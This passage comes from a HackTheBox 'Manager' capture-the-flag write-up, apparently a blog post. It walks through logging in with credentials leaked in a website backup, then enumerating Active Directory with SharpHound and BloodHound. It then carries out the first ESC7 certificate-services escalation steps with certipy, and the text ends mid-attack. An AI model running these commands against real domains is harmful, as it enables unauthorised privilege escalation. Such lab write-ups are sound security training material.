+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/manager/website-backup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ unzip website-backup-27-07-23-old.zip 
+</span></span><span class="line"><span class="cl">Archive:  website-backup-27-07-23-old.zip
+</span></span><span class="line"><span class="cl">  inflating: .old-conf.xml           
+</span></span><span class="line"><span class="cl">  inflating: about.html         
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It contains full credentials for a user on the box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;ldap-conf</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;server&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;host&gt;</span>dc01.manager.htb<span class="nt">&lt;/host&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;open-port</span> <span class="na">enabled=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>389<span class="nt">&lt;/open-port&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;secure-port</span> <span class="na">enabled=</span><span class="s">&#34;false&#34;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/secure-port&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;search-base&gt;</span>dc=manager,dc=htb<span class="nt">&lt;/search-base&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;server-type&gt;</span>microsoft<span class="nt">&lt;/server-type&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;access-user&gt;</span>
+</span></span><span class="line"><span class="cl">         <span class="nt">&lt;user&gt;</span>raven@manager.htb<span class="nt">&lt;/user&gt;</span>
+</span></span><span class="line"><span class="cl">         <span class="nt">&lt;password&gt;</span>R4v3nBe5tD3veloP3r!123<span class="nt">&lt;/password&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/access-user&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;uid-attribute&gt;</span>cn<span class="nt">&lt;/uid-attribute&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/server&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;search</span> <span class="na">type=</span><span class="s">&#34;full&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dir-list&gt;</span>
+</span></span><span class="line"><span class="cl">         <span class="nt">&lt;dir&gt;</span>cn=Operator1,CN=users,dc=manager,dc=htb<span class="nt">&lt;/dir&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dir-list&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/search&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ldap-conf&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>raven:R4v3nBe5tD3veloP3r!123</code>
+With this, we can use evil-winrm to authenticate:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager/website-backup]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.236 -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Raven\Documents&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="active-directory-enumeration-via-bloodhound">Active Directory Enumeration via Bloodhound
+</h3><h4 id="running-sharphound">Running SharpHound
+</h4><p>Active Directory can be very complex to navigate. Fortunately, the tool <code>bloodhound</code> can perform a lot of the enumerations, and organize it visually for us to analyze. The first step is to upload <code>SharpHound.exe</code>, the data collection tool, onto the box.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">downloads</span><span class="o">&gt;</span> <span class="n">upload</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">SharpCollection</span><span class="o">/</span><span class="n">NetFramework_4</span><span class="o">.</span><span class="mi">7</span><span class="n">_x64</span><span class="o">/</span><span class="n">SharpHound</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Uploading</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">SharpCollection</span><span class="o">/</span><span class="n">NetFramework_4</span><span class="o">.</span><span class="mi">7</span><span class="n">_x64</span><span class="o">/</span><span class="n">SharpHound</span><span class="o">.</span><span class="n">exe</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">downloads</span>\<span class="n">SharpHound</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Data</span><span class="p">:</span> <span class="mi">965288</span> <span class="n">bytes</span> <span class="n">of</span> <span class="mi">965288</span> <span class="n">bytes</span> <span class="n">copied</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Upload</span> <span class="n">successful</span><span class="o">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, run sharphound:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Downloads</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Sharphound</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">c</span> <span class="n">all</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">24</span><span class="n">T16</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">22.8146576</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">This</span> <span class="n">version</span> <span class="n">of</span> <span class="n">SharpHound</span> <span class="n">is</span> <span class="n">compatible</span> <span class="n">with</span> <span class="n">the</span> <span class="mf">4.3</span><span class="o">.</span><span class="mi">1</span> <span class="n">Release</span> <span class="n">of</span> <span class="n">BloodHound</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">24</span><span class="n">T16</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">22.9240425</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Resolved</span> <span class="n">Collection</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">Group</span><span class="p">,</span> <span class="n">LocalAdmin</span><span class="p">,</span> <span class="n">GPOLocalGroup</span><span class="p">,</span> <span class="n">Session</span><span class="p">,</span> <span class="n">LoggedOn</span><span class="p">,</span> <span class="n">Trusts</span><span class="p">,</span> <span class="n">ACL</span><span class="p">,</span> <span class="ne">Container</span><span class="p">,</span> <span class="n">RDP</span><span class="p">,</span> <span class="n">ObjectProps</span><span class="p">,</span> <span class="n">DCOM</span><span class="p">,</span> <span class="n">SPNTargets</span><span class="p">,</span> <span class="n">PSRemote</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">24</span><span class="n">T16</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">06.9865347</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">SharpHound</span> <span class="n">Enumeration</span> <span class="n">Completed</span> <span class="n">at</span> <span class="mi">4</span><span class="p">:</span><span class="mi">14</span> <span class="n">PM</span> <span class="n">on</span> <span class="mi">10</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span><span class="o">!</span> <span class="n">Happy</span> <span class="n">Graphing</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Downloads</span><span class="o">&gt;</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="ne">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Downloads</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">a</span><span class="o">----</span>       <span class="mi">10</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">4</span><span class="p">:</span><span class="mi">14</span> <span class="n">PM</span>          <span class="mi">11682</span> <span class="mi">20231024161406</span><span class="n">_BloodHound</span><span class="o">.</span><span class="n">zip</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">a</span><span class="o">----</span>       <span class="mi">10</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">4</span><span class="p">:</span><span class="mi">14</span> <span class="n">PM</span>           <span class="mi">8568</span> <span class="n">NjQ0M2M1ZmEtNTkyNy00OWNjLWJmNzAtOWZiMzUxMzM4MmNj</span><span class="o">.</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">a</span><span class="o">----</span>       <span class="mi">10</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">4</span><span class="p">:</span><span class="mi">12</span> <span class="n">PM</span>         <span class="mi">723968</span> <span class="n">SharpHound</span><span class="o">.</span><span class="n">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The resulting <code>.bin</code> file is an artifact that can be removed, while the <code>.zip</code> should be transferred back to kali for bloodhound enumeration.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Downloads</span><span class="o">&gt;</span> <span class="n">download</span> <span class="mi">20231024161406</span><span class="n">_BloodHound</span><span class="o">.</span><span class="n">zip</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Raven</span>\<span class="n">Downloads</span>\<span class="mi">20231024161406</span><span class="n">_BloodHound</span><span class="o">.</span><span class="n">zip</span> <span class="n">to</span> <span class="mi">20231024161406</span><span class="n">_BloodHound</span><span class="o">.</span><span class="n">zip</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Download</span> <span class="n">successful</span><span class="o">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="initializing-bloodhound">Initializing BloodHound
+</h4><p>Bloodhound relies on <code>neo4j</code>, so we must first start <code>neo4j</code> service. Currently, kali linux does not ship with <code>neo4j</code> installed, so it might need to be installed as well.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">manager</span><span class="o">/</span><span class="n">website</span><span class="o">-</span><span class="n">backup</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">sudo</span> <span class="n">neo4j</span> <span class="n">start</span>
+</span></span><span class="line"><span class="cl"><span class="n">Directories</span> <span class="ow">in</span> <span class="n">use</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">home</span><span class="p">:</span>         <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span>
+</span></span><span class="line"><span class="cl"><span class="n">config</span><span class="p">:</span>       <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">conf</span>
+</span></span><span class="line"><span class="cl"><span class="n">logs</span><span class="p">:</span>         <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">logs</span>
+</span></span><span class="line"><span class="cl"><span class="n">plugins</span><span class="p">:</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">plugins</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span><span class="p">:</span>       <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">import</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="p">:</span>         <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">certificates</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">certificates</span>
+</span></span><span class="line"><span class="cl"><span class="n">licenses</span><span class="p">:</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">licenses</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span>          <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">neo4j</span><span class="o">/</span><span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">Neo4j</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Started</span> <span class="n">neo4j</span> <span class="p">(</span><span class="n">pid</span><span class="p">:</span><span class="mi">183758</span><span class="p">)</span><span class="o">.</span> <span class="n">It</span> <span class="n">is</span> <span class="n">available</span> <span class="n">at</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">7474</span>
+</span></span><span class="line"><span class="cl"><span class="n">There</span> <span class="n">may</span> <span class="n">be</span> <span class="n">a</span> <span class="n">short</span> <span class="n">delay</span> <span class="n">until</span> <span class="n">the</span> <span class="n">server</span> <span class="n">is</span> <span class="n">ready</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If this is the first time running, <code>neo4j</code>, you need to visit localhost:7474 and change the login credentials off of the default, <code>neo4j:neo4j</code>. Afterwards, bloodhound is finally ready to start:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager/website-backup]
+</span></span><span class="line"><span class="cl">└─$ which bloodhound
+</span></span><span class="line"><span class="cl">/usr/bin/bloodhound
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager/website-backup]
+</span></span><span class="line"><span class="cl">└─$ bloodhound
+</span></span><span class="line"><span class="cl">(node:184873) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
+</span></span><span class="line"><span class="cl">(node:184943) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Bloodhound is already in my PATH, but this is not the default.</p>
+<h4 id="raven-is-a-member-of-certificate-service-dcom-access">Raven is a member of Certificate Service Dcom Access
+</h4><p>Exploring bloodhound, we can see Raven is a part of this group Certificate Service Dcom Access.</p>
+<p><img src="/p/hackthebox-manager/Images/Bloodhounding.png"
+	width="1089"
+	height="409"
+	srcset="/p/hackthebox-manager/Images/Bloodhounding_hu934158300614004556.png 480w, /p/hackthebox-manager/Images/Bloodhounding_hu10144598261635277312.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="639px"
+	
+></p>
+<p>Note that this relationship exists because Raven is a member of a group, that are members of a group, that are members of a group. Bloodhound tells us this information very easily, but this can be challenging to navigate manually. Thus, is the power of bloodhound visualization!</p>
+<h3 id="exploiting-ad-certificate-services">Exploiting AD Certificate Services
+</h3><p>This group is something I don&rsquo;t know much about, but doing short research shows some articles mentioning <a class="link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation"  target="_blank" rel="noopener"
+    >AD Certificate Services for privilege escalation</a>. Another article <a class="link" href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/"  target="_blank" rel="noopener"
+    >here</a>. We can use <code>certipy</code> to enumerate the certificate services:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ certipy find -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 33 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 11 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Trying to get CA configuration for &#39;manager-DC01-CA&#39; via CSRA
+</span></span><span class="line"><span class="cl">[*] Got CA configuration for &#39;manager-DC01-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Saved BloodHound data to &#39;20231023144351_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
+</span></span><span class="line"><span class="cl">[*] Saved text output to &#39;20231023144351_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Saved JSON output to &#39;20231023144351_Certipy.json&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The txt/json output gives us a lot of information about certificate services, but one line in particular sticks out:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">      &#34;[!] Vulnerabilities&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;ESC7&#34;: &#34;&#39;MANAGER.HTB\\\\Raven&#39; has dangerous permissions&#34;
+</span></span><span class="line"><span class="cl">      }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It looks like our user Raven has dangerous permissions over the template &ldquo;ESC7&rdquo;. Very fortunately, the hacktricks article mentioned earlier has a list of commands for <a class="link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7"  target="_blank" rel="noopener"
+    >exploiting ESC7</a>.</p>
+<h4 id="using-esc7-attack-2">Using ESC7 attack #2:
+</h4><p>Note that because the box seems to reset certificate changes frequently, the following commands must be performed at a relatively fast pace, or else the later commands will result in permission failures.
+First is to add Raven as an officer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ certipy ca -ca &#39;manager-DC01-CA&#39; -add-officer raven -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Successfully added officer &#39;Raven&#39; on &#39;manager-DC01-CA&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At this point, I use the domain <code>manager.htb</code>. If this is not added to your /etc/hosts with the ip address of the box, these commands will fail.</p>
+<p>Next, enabling <code>SubCA</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ certipy ca -u &#39;raven@manager.htb&#39; -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39; 
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Successfully enabled &#39;SubCA&#39; on &#39;manager-DC01-CA&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now using <code>SubCA</code>, we request a template. The request is denied, but we are still given the option to save the private key, which we will do.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -template SubCA -upn administrator@manager.htb 
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting certificate via RPC
+</span></span><span class="line"><span class="cl">[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+</span></span><span class="line"><span class="cl">[*] Request ID is 15
+</span></span><span class="line"><span class="cl">Would you like to save the private key? (y/N) y
+</span></span><span class="line"><span class="cl">[*] Saved private key to 15.key
+</span></span><span class="line"><span class="cl">[-] Failed to request certificate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, we issue a request using the saved private key.</p>
+<div class="highlight"><div class="chroma">
